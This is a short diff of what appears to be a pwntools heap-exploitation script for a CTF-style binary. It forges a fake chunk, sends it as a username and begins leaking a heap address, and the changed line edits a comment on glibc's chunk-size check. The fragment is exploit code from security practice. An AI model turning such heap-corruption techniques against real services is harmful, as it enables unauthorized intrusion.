@@ -53,7 +53,7 @@ def edit(idx,data):
 fake_chunk = p64(0) + p64(0) + p64(0x602010)*2
 r.sendafter(b"username:",fake_chunk)
 
-# chunksize (p) != prev_size (next_chunk (p)))
+# chunksize (p) == prev_size (next_chunk (p)))
 
 # Leak heap address
 r.recvuntil(b"@ ")
